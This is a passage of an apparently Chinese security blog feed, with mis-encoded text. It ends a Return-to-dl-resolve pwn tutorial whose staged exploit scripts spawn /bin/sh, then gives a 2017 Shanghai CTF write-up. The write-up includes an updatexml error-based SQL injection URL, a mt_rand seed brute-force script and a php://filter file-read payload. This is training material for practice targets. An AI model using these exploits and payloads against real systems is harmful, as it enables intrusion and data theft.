fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„<code>cmd</code>æ‰“å°å‡ºæ¥<br><a href="/images/Return-to-dl-resolve/1459442727696.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442727696.png" alt="Alt text"></a></p><h5 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h5><p>è¿™ä¸€æ¬¡æˆ‘ä»¬ä¼ªé€ <code>fake_sym</code>ï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„<code>st_name</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">fake_sym       &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">fake_sym       &#x3D; fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; 0x54</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym </span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„<code>cmd</code>æ‰“å°å‡ºæ¥<br><a href="/images/Return-to-dl-resolve/1459442523856.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442523856.png" alt="Alt text"></a></p><h5 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h5><p>è¿™æ¬¡æŠŠ<code>st_name</code>æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„å­—ç¬¦ä¸²<code>write</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">addr_fake_sym  &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  &#x3D; addr_fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (addr_fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym</span><br><span class="line">buf2 +&#x3D; &quot;write\x00&quot;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„<code>cmd</code>æ‰“å°å‡ºæ¥<br><a href="/images/Return-to-dl-resolve/1459442264800.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442264800.png" alt="Alt text"></a></p><h5 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h5><p>æ›¿æ¢<code>write</code>ä¸º<code>system</code>,å¹¶ä¿®æ”¹<code>system</code>çš„å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">addr_fake_sym  &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  &#x3D; addr_fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (addr_fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; &#39;aaaa&#39;</span><br><span class="line">buf2 +&#x3D; &#39;aaaa&#39;</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym</span><br><span class="line">buf2 +&#x3D; &quot;system\x00&quot;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ª<code>shell</code><br><a href="/images/Return-to-dl-resolve/1459442011940.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442011940.png" alt="Alt text"></a></p><h5 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h5><p>ä»¥ä¸Šåªæ˜¯å™è¿°åŸç†ï¼Œå½“ç„¶ä½ æ¯”è¾ƒæ‡’çš„è¯ï¼Œè¿™é‡Œå·²ç»æœ‰æˆç†Ÿçš„å·¥å…·è¾…åŠ©ç¼–å†™åˆ©ç”¨è„šæœ¬<a href="https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py">roputils</a></p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p>ã€1ã€‘<a href="https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=elf/elf.h">ELFæ–‡ä»¶æ ¼å¼</a><br>ã€2ã€‘<a href="http://www.xfocus.net/articles/200201/337.html">ELFåŠ¨æ€è§£æç¬¦å·è¿‡ç¨‹</a><br>ã€3ã€‘<a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve">Return to dl-resolve</a><br>ã€4ã€‘<a href="http://inaz2.hatenablog.com/entry/2014/07/15/023406">ROP stager + Return-to-dl-resolveã«ã‚ˆã‚‹ASLR+DEPå›é¿</a><br>ã€5ã€‘<a href="http://rk700.github.io/article/2015/08/09/return-to-dl-resolve">Return to dl-resolve</a><br>ã€6ã€‘<a href="http://www.inforsec.org/wp/?p=389">é€šè¿‡ELFåŠ¨æ€è£…è½½æœºåˆ¶è¿›è¡Œæ¼æ´åˆ©ç”¨</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸‰å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›ã€€</title>
      <link href="2017-shwas-Writeup-SeeSea.html"/>
      <url>2017-shwas-Writeup-SeeSea.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><p>ä¸‹è½½appï¼ŒåŠ å…¥åœˆå­ï¼ŒæŸ¥çœ‹flag</p><h1 id="Some-Words"><a href="#Some-Words" class="headerlink" title="Some Words"></a>Some Words</h1><p>é¢˜ç›®æ‹¦æˆªäº†union,and,=ç­‰å…³é”®å­—ï¼Œä½†æ˜¯æ²¡æœ‰æ‹¦æˆªselect mid from asciiç­‰å…³é”®å­—ï¼Œå¯ä»¥åˆ©ç”¨è¿ç®—ç¬¦è¿›è¡Œç›²æ³¨</p><h1 id="Some-Words-1"><a href="#Some-Words-1" class="headerlink" title="Some Words"></a>Some Words</h1><p>é¢˜ç›®æ‹¦æˆªäº†union,and,=ç­‰å…³é”®å­—ï¼Œä½†æ˜¯æ²¡æœ‰æ‹¦æˆªselect mid from asciiç­‰å…³é”®å­—ï¼Œå¯ä»¥åˆ©ç”¨è¿ç®—ç¬¦è¿›è¡Œç›²æ³¨</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/33577521.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/33577521.jpg"></a></p><p>ä½†æ˜¯è¿‡äºéº»çƒ¦ï¼Œå¯ä»¥çˆ†é”™ï¼Œé‚£å°±è¯•è¯•æŠ¥é”™æ³¨å…¥<br><code>http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select database() limit 1,1),0x7e),1)</code> å¾—åˆ°å½“å‰åº“ï¼Œç„¶åå¾—åˆ°è¡¨å’Œåˆ—ï¼Œæœ€åæŸ¥è¯¢flag</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/44572178.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/44572178.jpg"></a></p><p>å¾—åˆ°å‰32ä½ï¼Œmidä¸€ä¸‹å¾—åˆ°åé¢<code>http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select%20mid(f14g,32,100) from f14g  limit 0,1),0x7e),1)</code></p><h1 id="classical"><a href="#classical" class="headerlink" title="classical"></a>classical</h1><p><a href="https://quipqiup.com/">https://quipqiup.com</a><br>æ›¿æ¢å¯†ç ï¼Œåœ¨ä¸Šé¢çš„é“¾æ¥è§£å†³ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼š  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In cryptography, a classical cipher is a type of cipher that was used historically but now has fallen, for the most part, into disuse. In contrast to modern cryptographic algorithms, most classical ciphers can be practically computed and solved by hand. However, LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9 they are also usually very simple to break with modern technology. The term includes the simple systems used since Greek and Roman times, the elaborate Renaissance ciphers, World War II cryptography such as the Enigma machine and beyond. A quick brown fox jump over the lazy dog.</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9</code>è¿™ä¸²å­—ç¬¦ä¸²åº”è¯¥è¿˜æœ‰ä¸€å±‚åŠ å¯†ï¼ŒçŒœæµ‹æ˜¯è¿˜æœ‰ä¸€å±‚å¤å…¸å¯†ç ï¼Œå°è¯•å»è·‘å‡¯æ’’<br>æŠŠå‡¯æ’’çš„å„ç§æƒ…å†µè·‘å‡ºæ¥åï¼Œè¿›è¡Œ <code>base64</code> è§£ç å°±èƒ½å¾—åˆ° <code>flag</code></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/39740735.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/39740735.jpg"></a></p><h1 id="Welcome-To-My-Blog"><a href="#Welcome-To-My-Blog" class="headerlink" title="Welcome To My Blog"></a>Welcome To My Blog</h1><p>å‘ç°æœ‰ <code>.git</code> ç›®å½•ï¼Œå°è¯•æ¢å¤git <a href="https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/">https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/</a><br><a href="http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/">http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">printf</span> <span class="string">&quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot;</span> | cat - 3207b7443805336f105c63c6f9948f0c9ae7a4 | gunzip | hexdump -C</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºç   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;action&quot;</span>]))&#123;</span><br><span class="line">  $page = $_GET[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_exists($page.<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line">  $file = file_get_contents($page.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">&quot;action&quot;</span>]==<span class="string">&quot;album&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&quot;pid&quot;</span>]))&#123;</span><br><span class="line">     curl($_GET[<span class="string">&quot;pid&quot;</span>]);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰  <code>flag.php</code>ï¼Œ<br>è®¿é—® <code> http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/index.php?action=flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">&quot;flag&#123;149922b5-27da-44b7-92b5-3c1ccfa75264&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="Step-By-Step"><a href="#Step-By-Step" class="headerlink" title="Step By Step"></a>Step By Step</h1><p>é¡ºæ‰‹æ‰«äº†ä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æœ‰è¿™äº›æ–‡ä»¶ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;robots.txt</span><br><span class="line">&#x2F;index.php</span><br><span class="line">&#x2F;file.php</span><br><span class="line">&#x2F;flag.php</span><br><span class="line">&#x2F;admin.php</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ï¼Œ<code>robots.txt</code> ï¼Œé‡Œé¢æç¤º <code>code.zip</code>  ï¼Œç„¶å down ä¸‹æ¥æ˜¯è¢« <code>phpjiami</code> åŠ å¯†ä»£ç ï¼Œç„¶åè§£å¯†ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸‰ä¸ªæºæ–‡ä»¶ <code>index.php</code> ã€ <code>admin.php</code> ã€ <code>file.php</code>, è¿›è¡Œä»£ç å®¡è®¡<br>é¦–å…ˆçœ‹ä¸€ä¸‹ <code>index.php</code>ï¼Œæ˜¯ä¸€ä¸ªéšæœºç§å­çˆ†ç ´çš„æ¼æ´ï¼Œå†™äº†ä¸€ä¸ªçˆ†ç ´è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(â€˜max_execution_timeâ€™, â€˜<span class="number">0</span>â€™);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ–seed</span></span><br><span class="line">$seed = <span class="number">0</span>;</span><br><span class="line">$key = <span class="string">&#x27;å¡«å…¥index.phpè¿”å›çš„keyå€¼&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth_code</span>(<span class="params">$length = <span class="number">12</span>, $special = <span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">    $chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ($special) &#123;</span><br><span class="line">        $chars .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $password = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;=<span class="number">99999</span>; $i++)&#123;</span><br><span class="line">    mt_srand($i);</span><br><span class="line">    $hash1 = auth_code(<span class="number">16</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($hash1 === $key) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;find seeds :&quot;</span>.$i.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      $seed = $i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pri = auth_code(<span class="number">10</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;privateå€¼ä¸ºï¼š &#x27;</span>.$pri;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/64377317.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/64377317.jpg"></a></p><p>ç„¶åå‘ index.php å‘ post è¯·æ±‚ï¼Œ<code>private=X6B4CdeBOR</code>ï¼Œæ­¤æ—¶ä¼šæç¤º <code>No private!</code> ï¼Œå› ä¸ºæ­¤æ—¶sessionä¸ºç©ºï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡ä¼šå°†privateå­˜å…¥åˆ°sessionï¼Œå†å‘é€ç›¸åŒçš„è¯·æ±‚ï¼Œå°±ä¼šç›´æ¥è·³è½¬åˆ° <code>http://959b616a1c194d4d83f5b75a7a2f7ec6f63163b4fcbe4482.game.ichunqiu.com/admin.php?authAdmin=2017CtfY0ulike</code>ã€‚</p><p>å†æ¥çœ‹ä¸‹ <code>admin.php</code>ï¼Œ æœ‰ä¸€ä¸ª <code>json_decode($auth) == $auth_code</code> ï¼Œä½¿ç”¨ 0 è¿›è¡Œå¼±ç±»å‹ç»•è¿‡ã€‚æ­¤æ—¶å‡ºæ¥ä¸€ä¸ªè¡¨å•ï¼Œä½†æ˜¯ç‚¹å‡»æ²¡æœ‰ååº”ï¼ŒæŸ¥çœ‹jsï¼Œä½¿ç”¨äº† ajax è¿›è¡Œæäº¤ï¼Œå¯ä»¥è¿›è¡ŒæŠ“åŒ…ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  filename = $(<span class="string">&quot;#filename&quot;</span>).val();</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">&#x27;file.php&#x27;</span>,</span><br><span class="line">    type: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: filename,</span><br><span class="line">      <span class="string">&#x27;auth&#x27;</span>: <span class="string">&#x27;1234567890x&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    dataType: <span class="string">&#x27;text&#x27;</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result);</span><br><span class="line">    &#125;,</span><br><span class="line">    error: <span class="function"><span class="keyword">function</span>(<span class="params">XMLHttpRequest, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(XMLHttpRequest);</span><br><span class="line">      <span class="built_in">console</span>.log(textStatus);</span><br><span class="line">      <span class="built_in">console</span>.log(errorThrown);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å†çœ‹ä¸‹ <code>file.php</code> ï¼Œä¼  id ï¼Œå­—ç¬¦ä¸²éœ€è¦åŒ…å«æœ‰ <code>jpg</code> å’Œ æ»¡è¶³æ­£åˆ™ <code>preg_match(&quot;/^php:\/\/.*resource=([^|]*)/i&quot;, trim($id), $matches);</code> ï¼Œäºæ˜¯é‡‡ç”¨ php://filter è¿›è¡Œè¯»å–æ–‡ä»¶ï¼Œè”ç³»åˆ°ä¸Šé¢çš„ <code>flag.php</code>,äºæ˜¯ <code>id=php://filter/read=jpg/resource=flag.php</code>ï¼Œæ‹¿åˆ° flag</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/13290343.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/13290343.jpg"></a></p><h1 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h1><p>æ¯”è¾ƒç®€å•çš„åº”è¯¥é€†å‘é¢˜ç›®<br>è¿è¡Œç¨‹åºï¼Œç„¶åé™„åŠ <br>è¿™ä¸ªæ—¶å€™å·²ç»å‡ºç°äº†</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/55451041.jpg" 